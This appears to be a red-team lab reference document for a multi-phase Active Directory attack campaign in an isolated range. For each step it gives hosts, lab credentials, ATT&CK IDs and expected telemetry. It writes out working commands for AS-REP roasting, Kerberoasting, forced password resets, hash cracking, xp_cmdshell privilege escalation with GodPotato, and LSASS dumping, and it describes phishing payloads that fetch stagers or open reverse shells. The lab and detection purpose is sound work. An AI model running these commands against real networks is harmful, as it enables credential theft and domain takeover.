# CAMPAIGNS-METADATA-v2.md — Per-Attack Reference (v3-aligned)

**Companion to** [`CAMPAIGNS_v3.md`](CAMPAIGNS_v3.md). One metadata block per attack, aligned with the current v3 campaign design.

**Scope:** 94 campaign attacks (main spine Phases 0.5–8 + Post-DA sub-phase + 4 branches) + 14 E exercises + 12 F supply-chain scenarios + G standalone CVE exercises = **121 total**. E/F/G are standalone exercises, not part of the campaign narrative.

**Field guide:**

- **WT#** = Walkthrough / attack number from the campaign graph
- **Playbook** = `ansible/playbooks/*.yml` task(s) that create the misconfiguration
- **ACE#** = Specific Access Control Entry from `05-ad-attack-surface.yml`
- **Status** = `✅ Tested` / `✅ Active` / `⏳ Not yet tested` / `❌ Failed` / `🔬 Deferred`
- **RedStrike Intent** = typed builder name (`rubeus.asreproast`, `sql.xp_cmdshell`, etc.) used by `redstrike-campaign` / MCP
- **State Output** = `campaign_state.json` keys an agent should set when this step succeeds

**Topology / Machine Roles** (from `CAMPAIGNS_v3.md` lines 41-86)

> ### ⛔ HARD RULES — Campaign Run Rules (2026-08-03, operator-locked)
>
> **RULE 1 — Direct SSH to ws01 only; provisioning is for lab configuration.** Every attack in this campaign runs from `ws01` via direct SSH only.
> - **Attack origin:** `localhost → ws01` direct SSH (`analyst_t1` @ `192.168.77.62`) using `C:\Users\Ganro\.ssh\cadre-ws01-key`. No wrapper scripts, no provisioning bridge, no `ws01-exec.sh` / `ws01-stage-file.sh` indirection.
> - **Provisioning (`.60`) and the `vagrant` account are config-only** — they are used to configure the lab, apply/verify playbooks, deploy config, and run Ansible; they are **never** an attack origin.
> - **Tool staging:** tools/scripts are copied `localhost → ws01` via `scp` with the ws01 key, then executed by SSH-ing into ws01.
> - **Exception:** Rule 4’s H branch is the only case where provisioning hosts the initial-access delivery assets and `ws01` is the target.
>
> **RULE 2 — No scheduled tasks to run commands.** Scheduled tasks are **never** used as an execution wrapper just to run commands/tools. That is not how an attacker operates on a compromised machine; this campaign simulates real-world attack methodology. Scheduled tasks are legitimate **only as persistence mechanisms** (Phase 5) on an already-compromised machine.
> - The former "3.5B execution wrapper" use is **REJECTED**. Any validation evidence produced by running a command via a scheduled task is **invalid**.
> - If a scheduled task appears in the campaign, it must be a genuine persistence artifact (e.g. invisible-task via TaskCache SD deletion), not a "run this once" shortcut.
>
> **RULE 3 — Extraction/prerequisites are validated; cracking/computation/mutation is user practice.** We verify hashes, keys, blobs, and prerequisite state as completion criteria. Password cracking, offline computation, or mutating steps are not a validation requirement for the campaign run itself.
>
> **RULE 4 — H branch is the only branch where provisioning is the attacker.** For H-01..H-06, provisioning hosts the initial-access delivery assets and `ws01` is the target. We verify the delivery/drop side; a real browser click or execution by the user remains user practice.
>
> Violations of any of these rules are treated as invalid validation evidence.

| Machine | IP | Role | Beachhead? | Notes |
|---------|----|------|------------|-------|
| ws01 | 192.168.77.62 | Windows 11 workstation, MDE P2 | **Primary beachhead** | `child\analyst_t1` local admin; all AD tools staged in `C:\Tools\ADTools` |
| mbr01 | 192.168.77.22 | SQL Server 2022, IIS CertPotato, child member | Secondary target | SMB signing OFF; MSSQL port 1433; `analyst_t1` in Remote Management Users |
| mbr02 | 192.168.77.23 | SCCM site `CAD`, WSUS, range.local member | Branch C target | SMB signing OFF; ports 8530/8531 |
| dc01 | 192.168.77.10 | Root DC `cadre.local`, CA `cadre-CA`, DNS | Root KDC | SMB signing required; trust bridge to `range.local` with SID Filter OFF |
| dc02 | 192.168.77.11 | Child DC `child.cadre.local`, DNS | Child KDC | `intern_blue` has `DONT_REQUIRE_PREAUTH` |
| dc03 | 192.168.77.12 | Root DC `range.local`, AES-only, dMSA: ON | Cross-forest target | SMB signing required |
| linux01 | 192.168.77.40 | Ubuntu 24.04 domain-joined, SSSD, NFS krb5p, Podman privileged | Branch D pivot | `cadre.local` member; MSSQL Linux on 1433 |
| provisioning | 192.168.77.60 | Kali-like operator box | **Operator only** | Not a beachhead for campaign simulation |
| elk | 192.168.77.50 | Elastic Stack | Telemetry | Not used for attacks |
| monitor | 192.168.77.55 | Zeek + Suricata | Telemetry | Not used for attacks |
| vr | 192.168.77.51 | Velociraptor + DFIR-Nexus | Telemetry/DFIR | Not used for attacks |

**Identity / Credential Map** (v3 credential chain)

| Identity | Domain | Password/Hash | Where Used | How Obtained | RedStrike Ledger Name | State Key |
|----------|--------|-------------|------------|--------------|----------------------|-----------|
| `analyst_t1` | `child.cadre.local` | `T13r_An@lyst!` | ws01 beachhead, mbr01 SQL auth, mbr01 WinRM | Assumed-breach / H-01..H-06 | `analyst_t1` | `creds.analyst_t1.password` |
| `intern_blue` | `child.cadre.local` | `1nt3rn_Blu3!` | Phase 1 recon, ACE#18 bridge | AS-REP roast (WT003) | `intern_blue` | `creds.intern_blue.password` |
| `analyst_t2` | `child.cadre.local` | reset during Phase 2 | ACE#18 bridge credential | `intern_blue` ForceChangePassword | `analyst_t2` | `creds.analyst_t2.password` |
| `svc_mssql` | `child.cadre.local` | `s3rv1c3_MSSQL!` | Phase 2 pivot, mbr01 SQL sysadmin | Kerberoast via ACE#18 (WT002) | `svc_mssql` | `creds.svc_mssql.password` |
| `analyst_cloud` | `cadre.local` | `Cl0ud_An@lyst!` | mbr01 auto-logon, cross-domain auth, Branch A | 3.5A Winlogon registry extraction | `analyst_cloud` | `creds.analyst_cloud.password` |
| `dc02$` | `child.cadre.local` | TGT | Phase 6 DCSync | Phase 5 coercion + Rubeus monitor (T102) | `dc02_machine` | `creds.dc02_machine.ticket` |
| `child\krbtgt` | `child.cadre.local` | hash | Phase 7 Golden Ticket | Phase 6 DCSync (WT009) | `child_krbtgt` | `creds.child_krbtgt.nt_hash` |
| `root EA` | `cadre.local` | TGT | Phase 8 cross-forest | Phase 7 Golden Ticket + ExtraSids | `cadre_ea` | `creds.cadre_ea.ticket` |
| `svc_sccm` | `range.local` | `s3rv1c3_SCCM!` | Branch C SCCM operations | Phase 8 cross-forest Kerberoast (WT033) | `svc_sccm` | `creds.svc_sccm.password` |
| `svc_naa` | `range.local` | `N@A_s3rv1c3!` | range.local Domain Admin | Branch C NAA extraction (WT034) | `svc_naa` | `creds.svc_naa.password` |

**Realistic Attack Principles**

1. **No direct operator-to-target execution.** The operator uses `ws01` as the beachhead; commands run from `ws01` as `analyst_t1` unless noted.
2. **Direct SSH only (Rule 1).** The attack lane is `localhost → ws01` direct SSH (`cadre-ws01-key`). No provisioning bridge, no `nxc winrm` wrappers, no staging-wrapper indirection. Provisioning is config-only.
3. **Right credential on the right machine.** `analyst_t1` is used on `ws01` and `mbr01` (SQL/WinRM). `svc_mssql` is Phase 2 service account. `analyst_cloud` is extracted from `mbr01` and used for cross-domain/local movement. `dc02$` TGT is used for DCSync. `krbtgt` is used for Golden Ticket.
4. **Lateral tool transfer over SMB.** Tools are staged on `ws01` in `C:\Tools\ADTools` and copied to `mbr01` via `C$`/`ADMIN$` shares, not downloaded from Kali directly onto `mbr01`.
5. **No scheduled tasks for attack execution (Rule 2).** Scheduled tasks are persistence-only, never execution wrappers. Running a command/tool via a scheduled task is rejected methodology.
6. **No provisioning shortcuts.** `provisioning` is for tooling/inventory; it does not execute campaign commands against lab targets directly.


## Main Spine — Phases 0.5–8

### Phase 0.5 — Initial Access on ws01 (H-01..H-06)

| Field | Value |
|-------|-------|
| **Status** | ✅ Verified 2026-08-03 (5/6 live; H-03 build+content verified, exec platform-blocked) |
| **Stream** | Initial Access (ws01 beachhead) |
| **Att&ck** | T1566.001 (Spearphishing Attachment) / T1204.002 (User Execution: Malicious File) |
| **Technique** | File-based execution vectors against `ws01` / `analyst_t1` |
| **What it does** | Six realistic phishing/file-delivery techniques (LNK, MSI, CHM, HTML smuggling, AutoIt3, EXE) establish a user-context C2 beachhead on `ws01`. |
| **Playbook** | `19-initial-access.yml` + `-verifyOnly.yml` — stages H artifacts on provisioning `~/www` + HTTP :8081 + ws01 staging dir |
| **Prerequisite** | `ws01` domain-joined; MDE P2 Healthy; Elastic Agent Healthy under `CADRE-WS01` policy; provisioning reachable at `192.168.77.60:8081` |
| **Target AD object** | `CN=analyst_t1,OU=WS01-MDE,DC=child,DC=cadre,DC=local` (user) |
| **Source machine** | provisioning (`192.168.77.60`, HTTP :8081) — ONLY branch where provisioning is attacker + ws01 is target |
| **Target machine** | `ws01` (`192.168.77.62`) |
| **Domain joined?** | Yes (`child.cadre.local`) |
| **Domain** | `child.cadre.local` |
| **Starting credential** | None — relies on user execution |
| **What it earns** | `child.cadre.local\analyst_t1` C2 session |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | Sysmon EID 1/11/3; WinSec 4688; MDE P2 alerts; Elastic `logs-windows.*` + `logs-system.security*`; MOTW `zone.identifier` ADS |
| **Execution mode** | Manual (user click) — not automated in spine run |

#### H-01 — Malicious LNK

| Field | Value |
|-------|-------|
| **WT#** | 063 (relocated to Phase 0.5) |
| **Status** | ✅ VERIFIED 2026-08-03 — Invoice.lnk (1793B) built on ws01; simulated click → marker `H-PAYLOAD|executed as CHILD\analyst_t1|WS01`; hosted provisioning:8081 |
| **Att&ck** | T1204.002 |
| **Technique** | `.lnk` with crafted `Target` field invokes `powershell.exe` to download second stage |
| **What it does** | User double-clicks LNK; `explorer.exe` spawns `powershell.exe -w hidden` which downloads `stager.ps1` from Kali and executes it. |
| **Playbook** | None (manual payload) |
| **Prerequisite** | User can open `.lnk` from Downloads; HTTP egress from `ws01` to `192.168.77.60:8080` allowed |
| **Target AD object** | `CN=analyst_t1` |
| **Source machine** | Kali |
| **Target machine** | `ws01` (`192.168.77.62`) |
| **Starting credential** | None |
| **What it earns** | `analyst_t1` C2 session |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | Sysmon EID 1 (`powershell.exe` child of `explorer.exe`); EID 11 (`%TEMP%\stager.ps1`); EID 3 (HTTP to Kali); WinSec 4688; MDE `Suspicious LNK file`; MOTW `zone.identifier` |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/H-01-lnk-ws01.sh` (stages payload) |

#### H-02 — MSI Installer

| Field | Value |
|-------|-------|
| **WT#** | 064 (relocated to Phase 0.5) |
| **Status** | ✅ VERIFIED 2026-08-03 — WiX candle+light → H-02-evil.msi (32768B); `msiexec /i /qn` → deferred CA (After=InstallFiles, ICE77 fix) ran payload → marker; hosted provisioning:8081 |
| **Att&ck** | T1218.007 |
| **Technique** | Weaponized `.msi` custom action launches reverse shell or downloader |
| **What it does** | `msiexec.exe /i` runs a custom action that executes a payload, yielding user-context code execution. |
| **Playbook** | None (manual payload) |
| **Prerequisite** | `msiexec` allowed; user can install per-user MSI |
| **Target AD object** | `CN=analyst_t1` |
| **Source machine** | Kali |
| **Target machine** | `ws01` |
| **Starting credential** | None |
| **What it earns** | `analyst_t1` C2 session |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | Sysmon EID 1 (`msiexec.exe` child processes); EID 11/12; EID 3; WinSec 4688; MDE `Suspicious msiexec network activity`; MOTW `zone.identifier` |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/H-02-msi-ws01.sh` |

#### H-03 — Compiled HTML Help (.chm)

| Field | Value |
|-------|-------|
| **WT#** | 065 (relocated to Phase 0.5) |
| **Status** | ⚠️ BUILD+CONTENT VERIFIED 2026-08-03 — hhc compiled CHM (9306B); decompile confirms Shortcut object + `cmd.exe /c payload.exe`; execution blocked by modern hh.exe ActiveX sandbox (platform limit, same class as WT012) |
| **Att&ck** | T1218.001 |
| **Technique** | `.chm` `Shortcut`/`object` tag invokes `cmd.exe` / `powershell.exe` from `hh.exe` |
| **What it does** | HTML Help viewer executes embedded payload, spawning a hidden shell. |
| **Playbook** | None (manual payload) |
| **Prerequisite** | `hh.exe` present; user can open `.chm` |
| **Target AD object** | `CN=analyst_t1` |
| **Source machine** | Kali |
| **Target machine** | `ws01` |
| **Starting credential** | None |
| **What it earns** | `analyst_t1` C2 session |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | Sysmon EID 1 (`hh.exe` → `cmd.exe`/`powershell.exe`); EID 11; EID 3; WinSec 4688; MDE `Suspicious HTML Help Execution`; MOTW `zone.identifier` |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/H-03-chm-ws01.sh` |

#### H-04 — HTML Smuggling

| Field | Value |
|-------|-------|
| **WT#** | 066 (relocated to Phase 0.5) |
| **Status** | ✅ BUILDER VERIFIED 2026-08-03 — wt066-html-smuggling.py produced H-04-smuggle.html (5883B) with 4096B payload embedded; hosted provisioning:8081; browser detonation = user practice (Rule 3) |
| **Att&ck** | T1027.006 |
| **Technique** | JavaScript assembles blob/executable client-side and triggers download |
| **What it does** | Browser opens malicious HTML; JS builds an executable from a base64 blob and downloads it, evading simple attachment filters. |
| **Playbook** | None (manual payload) |
| **Prerequisite** | Browser (Edge/Chrome) allows blob downloads; user opens link |
| **Target AD object** | `CN=analyst_t1` |
| **Source machine** | Kali HTTP server |
| **Target machine** | `ws01` |
| **Starting credential** | None |
| **What it earns** | `analyst_t1` C2 session |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | Browser download history; Sysmon EID 11 (Downloads); EID 1 (payload execution); EID 3; MDE `HTML smuggling` / `Suspicious download`; MOTW `zone.identifier` |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/H-04-html-smuggling-ws01.sh` |

#### H-05 — AutoIt3

| Field | Value |
|-------|-------|
| **WT#** | 067 (relocated to Phase 0.5) |
| **Status** | ✅ VERIFIED 2026-08-03 — AutoIt3.exe (980064B) + au3 script pulled from provisioning:8081 → executed → marker `H-PAYLOAD|executed as CHILD\analyst_t1|WS01` |
| **Att&ck** | T1059.005 |
| **Technique** | Compiled or interpreted AutoIt3 script downloads and runs second stage |
| **What it does** | `AutoIt3.exe` or compiled AutoIt binary executes a script that downloads `stager.ps1` and runs it in a hidden shell. |
| **Playbook** | None (manual payload) |
| **Prerequisite** | `AutoIt3.exe` available on `ws01`; user can run `.au3` or compiled binary |
| **Target AD object** | `CN=analyst_t1` |
| **Source machine** | Kali |
| **Target machine** | `ws01` |
| **Starting credential** | None |
| **What it earns** | `analyst_t1` C2 session |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | Sysmon EID 1 (`AutoIt3.exe` or compiled payload); EID 11; EID 3; WinSec 4688; MDE `Suspicious AutoIt execution`; MOTW `zone.identifier` |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/H-05-autoit-ws01.sh` |

#### H-06 — Malicious EXE

| Field | Value |
|-------|-------|
| **WT#** | 068 (relocated to Phase 0.5) |
| **Status** | ✅ VERIFIED 2026-08-03 — payload.exe (4096B) downloaded from provisioning:8081 → executed → marker (22:35:19 UTC) |
| **Att&ck** | T1204.002 |
| **Technique** | Executable payload (C2 stager) delivered as fake update or viewer |
| **What it does** | User runs `Update.exe`; it connects back to Kali, giving a reverse shell. |
| **Playbook** | None (manual payload) |
| **Prerequisite** | User can execute unsigned `.exe`; Windows Defender/MDE real-time protection allows (test) payload |
| **Target AD object** | `CN=analyst_t1` |
| **Source machine** | Kali |
| **Target machine** | `ws01` |
| **Starting credential** | None |
| **What it earns** | `analyst_t1` C2 session |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | Sysmon EID 1 (unknown `.exe` child of `explorer.exe`); EID 11/12; EID 3; EID 7; WinSec 4688; MDE `Suspicious process` / `Malware detected`; MOTW `zone.identifier` |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/H-06-exe-ws01.sh` |

### Phase 0.5 → Phase 1 Transition

| Field | Value |
|-------|-------|
| **Starting cred** | `child\analyst_t1` / `T13r_An@lyst!` (local admin on ws01) |
| **Tool access** | `C:\Tools\ADTools` pre-staged; WinRM to mbr01; PSRemoting enabled |
| **Identity rule** | `analyst_t1` is used on `ws01` and `mbr01` (Remote Management Users). `svc_mssql` is the Phase 2 service account. `analyst_cloud` is extracted from `mbr01` and used for cross-domain/local movement. |
| **Execution mode** | All subsequent spine phases run from `ws01` as `analyst_t1` unless noted. |
| **RedStrike Intent** | — (manual initial access) |
| **State Output** | SET_STATE(c2_session.analyst_t1 = true) |

---

### Phase 1 — Initial Access (WT003: AS-REP Roast)

| Field | Value |
|-------|-------|
| **WT#** | 003 |
| **Status** | ✅ Tested from ws01 |
| **Stream** | Core AD (five-stream-merge §3) |
| **Att&ck** | T1558.004 (AS-REP Roasting) |
| **Technique** | AS-REP Roasting |
| **What it does** | Sends AS-REQ to KDC for `intern_blue` who has `DONT_REQUIRE_PREAUTH`. KDC returns AS-REP encrypted with user's RC4-derived key — crackable offline. |
| **Playbook** | `05-ad-attack-surface.yml` lines 859-866 — Sets `DoesNotRequirePreAuth $true` on `intern_blue` |
| **ACE#** | N/A (direct UAC misconfig) |
| **Prerequisite** | Target user has `UF_DONT_REQUIRE_PREAUTH` (0x400000) in `userAccountControl` |
| **Target AD object** | `CN=intern_blue,OU=Detection,DC=child,DC=cadre,DC=local` (user) |
| **Source machine** | `ws01` (`192.168.77.62`) as `child\analyst_t1` |
| **Target machine** | dc02 (`192.168.77.11`) — KDC for child.cadre.local |
| **Domain joined?** | Yes (`child.cadre.local`) |
| **Domain** | `child.cadre.local` |
| **Starting credential** | `child\analyst_t1` / `T13r_An@lyst!` |
| **What it earns** | `intern_blue` AS-REP hash — offline crack → `1nt3rn_Blu3!` |
| **RedStrike Intent** | `rubeus.asreproast` |
| **State Output** | SET_STATE(creds.intern_blue.password = "1nt3rn_Blu3!") |
| **Command** | `Rubeus.exe asreproast /dc:dc02.child.cadre.local /outfile:C:\Tools\cadre-attack\intern_blue_asrep.txt /format:hashcat` |
| **Crack** | `hashcat -m 18200 intern_blue_asrep.txt /wordlist.txt` |
| **Key telemetry** | WinSec 4768 (PreAuthType:0, TargetUserName:intern_blue); Zeek kerberos.log (AS-REQ/AS-REP); Suri cadre-ad.rules SID:1000015 |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T003-asrep-ws01.sh` |

#### Step 1 — Discover valid usernames (Phase 0 recon)

| Field | Value |
|-------|-------|
| **Technique** | Kerberos user enumeration via `nmap` or `kerbrute` |
| **Source** | `ws01` or Kali |
| **Command** | `nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='child.cadre.local',userdb=users.txt dc02.child.cadre.local` |
| **What it earns** | List of valid usernames (e.g., `intern_blue`, `analyst_t1`, `analyst_t2`, `svc_mssql`) |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | WinSec 4768 (failed pre-auth); Zeek kerberos.log (KRB_ERR_PREAUTH_REQUIRED) |

#### Step 2 — Check for AS-REP roastable users

| Field | Value |
|-------|-------|
| **Technique** | `Rubeus.exe asreproast` or `impacket-GetNPUsers` |
| **Source** | `ws01` |
| **Command** | `Rubeus.exe asreproast /dc:dc02.child.cadre.local /format:hashcat` |
| **What it earns** | `intern_blue` AS-REP hash |
| **Key telemetry** | WinSec 4768 (success); Zeek AS-REP |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

#### Step 3 — NetExec Authenticated Recon (First Credential: `intern_blue`)

| Field | Value |
|-------|-------|
| **Status** | ✅ Tested |
| **Technique** | NetExec authenticated recon with first credential |
| **Source** | `ws01` as `intern_blue` |
| **Command** | `nxc smb 192.168.77.10-23 -u intern_blue -p '1nt3rn_Blu3!' -d child.cadre.local` |
| **What it reveals** | SMB access, shares, signed/unsigned status, local admin rights |
| **Key telemetry** | WinSec 4624 Type 3; Zeek smb.log; Suri SID:100000? |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

---

### Phase 2 — Credential Harvesting (WT002: Kerberoast via ACE#18)

| Field | Value |
|-------|-------|
| **WT#** | 002 |
| **Status** | ✅ Tested from ws01 |
| **Stream** | Core AD (five-stream-merge §3) |
| **Att&ck** | T1558.003 (Kerberoasting) |
| **Technique** | AES Kerberoasting via ACE#18 bridge |
| **What it does** | ACE#18 gives `intern_blue` ForceChangePassword on `analyst_t2`. Reset `analyst_t2`'s password, get TGT, then request TGS for `svc_mssql`'s SPN. |
| **Playbook** | `05-ad-attack-surface.yml` — ACE#18 lines 489-519; SPN registration line 827: `svc_mssql` → `MSSQLSvc/mbr01.child.cadre.local:1433`. |
| **ACE#** | 18 (intern_blue → analyst_t2: ForceChangePassword) |
| **Prerequisite** | `intern_blue` credential (WT003) + ACE#18 on dc02 |
| **Target AD objects** | `svc_mssql` (SPN); `analyst_t2` (ACE bridge) |
| **Source machine** | `ws01` as `intern_blue` |
| **Target machine** | dc02 (`192.168.77.11`) |
| **Domain joined?** | Yes (`child.cadre.local`) |
| **Domain** | `child.cadre.local` |
| **Starting credential** | `intern_blue` / `1nt3rn_Blu3!` |
| **What it earns** | `svc_mssql` / `s3rv1c3_MSSQL!` — MSSQL service account, sysadmin on mbr01 |
| **RedStrike Intent** | `rubeus.kerberoast` + `bloodyad.set_password` |
| **State Output** | SET_STATE(creds.svc_mssql.password = "s3rv1c3_MSSQL!") |
| **Step 1** | `bloodyAD --host dc02.child.cadre.local -u intern_blue -p '1nt3rn_Blu3!' -d child.cadre.local set password analyst_t2 'TempPass123!'` |
| **Step 2** | `Rubeus.exe kerberoast /creduser:child.cadre.local\analyst_t2 /credpassword:'TempPass123!' /domain:child.cadre.local /dc:dc02.child.cadre.local /outfile:svc_mssql_tgs.txt /format:hashcat` |
| **Crack** | `hashcat -m 13100 svc_mssql_tgs.txt /wordlist.txt` |
| **Key telemetry** | WinSec 4738 (password reset), 4769 (TGS, TicketEncryptionType:0x12); Zeek kerberos.log; Suri SID:1000015 |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T002-kerb-ws01.sh` |
| **Note** | Direct `svc_mssql` Kerberoast from `intern_blue` fails because `intern_blue` has `DONT_REQUIRE_PREAUTH` and cannot request a TGS normally. The ACE#18 bridge is required. |

#### NTLMv1 Rainbow Tables — Credential Downgrade (SpecterOps "Into The Rainbow")

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not yet tested |
| **Att&ck** | T1557 (Man-in-the-Middle) / T1552 (Unsecured Credentials) |
| **Technique** | Force NTLMv1 downgrade, capture response, crack with rainbow tables |
| **What it does** | Set `LmCompatibilityLevel=0` or `NoLMHash=0` to force NTLMv1; coerce or intercept auth; crack with rainbow tables (e.g., `rainbowcrack` / `crack.sh`). |
| **Prerequisite** | Target allows NTLMv1; attacker controls responder/relay position |
| **Source** | `ws01` or Kali |
| **Target** | any domain member |
| **What it earns** | NTLM hash of captured credential |
| **Key telemetry** | WinSec 4674 (NTLMv1 auth); Zeek ntlm.log if available |
| **Status** | ⏳ Deferred; not in main spine |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

---

### Phase 3 — Execution (WT041/043: SQL xp_cmdshell)

| Field | Value |
|-------|-------|
| **WT#** | 041 / 043 |
| **Status** | ✅ Tested from ws01 |
| **Stream** | Core AD |
| **Att&ck** | T1059 (Command Interpreter: xp_cmdshell) / T1078 (Valid Accounts) |
| **Technique** | SQL authentication → `xp_cmdshell` → OS command execution |
| **What it does** | `svc_mssql` is sysadmin on mbr01; `analyst_t1` has `IMPERSONATE sa`. Execute OS commands via SQL `xp_cmdshell`. |
| **Playbook** | `09-sql-wsus-verify.yml` — enables xp_cmdshell, mixed mode auth; creates SQL logins for `svc_mssql` and `analyst_t1`, grants `IMPERSONATE sa` to `analyst_t1` |
| **Prerequisite** | `svc_mssql` or `analyst_t1` SQL credential + xp_cmdshell enabled + `IMPERSONATE sa` (for analyst_t1) |
| **Target AD object** | `svc_mssql`, `analyst_t1` (SQL principals) |
| **Source machine** | `ws01` (`192.168.77.62`) as `child\analyst_t1` |
| **Target machine** | mbr01 (`192.168.77.22`) — SQL Server Express on port 1433 |
| **Domain** | `child.cadre.local` |
| **Starting credential** | `analyst_t1` / `T13r_An@lyst!` (SQL auth) |
| **What it earns** | OS command execution on mbr01 as `nt service\mssql$sqlexpress` → `SeImpersonatePrivilege` → GodPotato → `nt authority\system` |
| **RedStrike Intent** | `sql.xp_cmdshell` |
| **State Output** | SET_STATE(beachhead.mbr01.system = true) |
| **Step 1 (enumerate)** | `impacket-mssqlclient 'analyst_t1:T13r_An@lyst!@192.168.77.22'` then `SELECT IS_SRVROLEMEMBER('sysadmin');` and `SELECT name FROM sys.server_principals WHERE principal_id IN (SELECT grantee_principal_id FROM sys.server_permissions WHERE permission_name='IMPERSONATE');` |
| **Step 2 (xp_cmdshell)** | `EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'whoami /priv';` |
| **Step 3 (GodPotato)** | Stage `GodPotato-NET4.exe` on mbr01 via `C$` from `ws01`; run `EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c whoami"';` → `nt authority\system` |
| **Key telemetry** | WinSec 4624 Type 8, 4688; Sysmon EID 1 (cmd/powershell), 3; Endpt process; Zeek smb.log; PS EID 4104 |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T043-impersonate-ws01.sh` + `campaign-a-t043-impersonate.ps1` |
| **Helper** | `campaign-a-t043-system-exec.ps1` — runs arbitrary PowerShell script block as SYSTEM on mbr01 via the SQL → GodPotato channel |
| **Note** | ✅ Tested from ws01 — GodPotato via SQL xp_cmdshell returns `nt authority\system` on mbr01. |
| **Identity note** | `analyst_t1` (not `svc_mssql`) is the SQL identity with `IMPERSONATE sa`. `svc_mssql` is the Phase 2 Kerberoasted service account. |

#### WT042 — CLR Assembly (Alternative SQL execution on mbr02)

| Field | Value |
|-------|-------|
| **WT#** | 042 |
| **Status** | ✅ Tested from ws01 — SQL CLR execution path on mbr02 reachable via SQL auth |
| **Att&ck** | T1059 |
| **Technique** | Deploy malicious CLR assembly on mbr02 (CLR enabled, TRUSTWORTHY ON, strict security=0) |
| **What it does** | Load .NET assembly inside SQL Server and execute arbitrary code as the SQL service account. |
| **Source** | `ws01` or Kali |
| **Target** | mbr02 (`192.168.77.23`) |
| **Starting credential** | `svc_mssql` or `analyst_t1` |
| **Key telemetry** | SQL Server audit events; Sysmon EID 1/7; WinSec 4688 |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T042-clr-ws01.sh` |
| **RedStrike Intent** | `sql.xp_cmdshell` (CLR variant) |
| **State Output** | SET_STATE(beachhead.mbr02.system = true) |

---

### Phase 3.5 — Lateral Movement: WinRS from ws01 to mbr01 (T101)

| Field | Value |
|-------|-------|
| **WT#** | 101 |
| **Status** | ✅ Tested from ws01 |
| **Stream** | Core AD |
| **Att&ck** | T1021.006 (Remote Services: Windows Remote Management) |
| **Technique** | WinRS/PSRemoting from `ws01` to `mbr01` as `analyst_t1` |
| **What it does** | Establish command channel on `mbr01` using `analyst_t1`'s domain credentials. `analyst_t1` is in `Remote Management Users` on `mbr01`. |
| **Playbook** | `06-member-services.yml` — adds `analyst_t1` to `Remote Management Users` on mbr01 |
| **Prerequisite** | `analyst_t1` / `T13r_An@lyst!` + `mbr01` in `TrustedHosts` on `ws01` + WinRM listener on mbr01 |
| **Source machine** | `ws01` (`192.168.77.62`) as `child\analyst_t1` |
| **Target machine** | mbr01 (`192.168.77.22`) |
| **Starting credential** | `analyst_t1` / `T13r_An@lyst!` |
| **What it earns** | Command execution on `mbr01` as `child\analyst_t1` (limited privileges) |
| **RedStrike Intent** | `winrs.command` |
| **State Output** | SET_STATE(beachhead.mbr01.command = true) |
| **Command** | `winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! whoami` |
| **Key telemetry** | WinSec 4624 Type 3; Sysmon EID 1 (`winrs.exe`/`wsmprovhost.exe`), 3; WinRM 91/93 |
| **Script** | `attack-matrix/04-automation/linux/campaign-a/T101-winrs-pivot-ws01.sh` |
| **Note** | `analyst_t1` on mbr01 has only `SeChangeNotifyPrivilege` and `SeIncreaseWorkingSetPrivilege` by default; this is why LPE is required via the SQL path instead. |

---

### Branch 3.5 — Credential Theft from SYSTEM

We have `nt authority\system` on mbr01 via GodPotato. `analyst_cloud` has an active console session (auto-logon). Goal: extract domain credentials for BloodHound collection and lateral movement.

| Field | Value |
|-------|-------|
| **Source machine** | `ws01` as `analyst_t1` → commands execute as SYSTEM on `mbr01` via SQL → GodPotato channel |
| **Target machine** | mbr01 (`192.168.77.22`) |
| **Channel** | `campaign-a-t043-system-exec.ps1` (SQL auth as `analyst_t1` → `IMPERSONATE sa` → `xp_cmdshell` → GodPotato) |
| **Lab security posture** | LSASS PPL: OFF; VBS/Credential Guard: OFF |

#### 3.5F — LSASS Credential Dump (T1003.001) ⭐ PRIMARY

| Field | Value |
|-------|-------|
| **Status** | ✅ Tested from ws01 via SYSTEM-exec helper |
| **Att&ck** | T1003.001 (OS Credential Dumping: LSASS Memory) |
| **Technique** | SYSTEM + mimikatz `lsadump::sam` / `sekurlsa::logonpasswords` |
| **What it does** | GodPotato gives SYSTEM on mbr01. mimikatz reads the SAM registry hive and LSASS memory to extract local/domain credentials. |
| **Prerequisite** | SYSTEM on mbr01 (GodPotato via SQL chain) |
| **Source machine** | `ws01` → SYSTEM on mbr01 |
| **Target machine** | mbr01 (`192.168.77.22`) |
| **Domain** | `child.cadre.local` (plus `cadre.local` via cross-domain trust) |
| **What it earns** | Local SAM hashes + `analyst_cloud` NTLM/Kerberos if in LSASS |
| **RedStrike Intent** | `mimikatz.logonpasswords` / `mimikatz.sam` |
| **State Output** | SET_STATE(creds.analyst_cloud.nt_hash = <extracted>) |
| **Command** | `campaign-a-t035-mbr01-creds.ps1` via `T035-mbr01-creds-ws01.sh` |
